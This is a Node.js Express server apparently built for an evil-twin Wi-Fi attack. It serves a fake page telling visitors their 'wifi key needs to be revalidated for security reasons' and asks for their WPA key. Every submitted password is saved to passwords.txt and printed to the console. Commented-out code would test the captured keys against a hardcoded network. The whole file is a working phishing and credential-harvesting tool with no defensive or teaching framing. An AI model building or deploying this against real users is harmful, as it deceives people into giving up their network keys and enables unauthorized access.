const express = require('express')
const app = express()
const port = 80
const fs = require('fs');
const BodyParser = require('body-parser')
/* Import node-wifi 
const wifi = require('node-wifi');
//https://www.npmjs.com/package/node-wifi
*/
app.use(BodyParser.urlencoded({extended: true}))

var title ='';

const generateHTML = (title) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Wifi Service</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #d5dbdb ;
      padding: 20px;
     
    }
    button{
		padding: 10px;
	}
	#connecting{
		visibility: hidden;
	}
   
  </style>
</head>
<body>
  <div id="password-form">
  	<div>${title || ''}</div>
      <img src="./wifi-icon3.png" alt="" width="180vw">
      
      <p>Your wifi key needs to be revalidated for security reasons.</p> 

	  <form method="post" action="password" id="mform">
		<p>Please enter your modem's WPA wifi key to connect to the Internet: </p>
		<input type="text" name="password" size="35%">
		<passwordp><input type="submit" name="button"  value="Connect"></p>
	  </form> 
  </div>
	
</body>
</html>`;
 
/* 
This part check if the given password is correct.
# checkPassword - is a Promise
 const checkPassword = async (password) => {
    //const iface = process.argv[2];
    //const ssid = process.argv[3];
    const iface = "wlxc83a35c2e0b7";
    const ssid = "Linksys00314";
    await wifi.init({ iface });
    try {
        const ans = await wifi.connect({ ssid, password });
        console.log('The password the client enter is CORRECT');
        return true;
    } catch (e) {
    	console.log('The password the client enter is INCORRECT');
        return false;
    }
};
*/
 
app.get('/', (req, res) => {
    console.log('The client tried to enter a website.');
    
    res.send(generateHTML());
});

/* 
app.post('/password', async (req, res) => {
*/
app.post('/password', (req, res) => {
    const password = req.body.password;
    fs.appendFileSync('passwords.txt', `password : ${password} \n`);
    console.log(`The client enter another password : ${password} \nYou may also see this password in - passwords.txt`);
    /*
    const ans = await checkPassword(password);
    title = ans ? 'Great succeess :)' : 'The password is incorrect. :(';
    */
    title = "Authenticating...\n If you wait more than 1min. the password is INCORRECT."
    res.send(generateHTML(title));
});


app.listen(port, () => {
    console.log(`WebServer is up. Listening at http://localhost:${port}`);
})
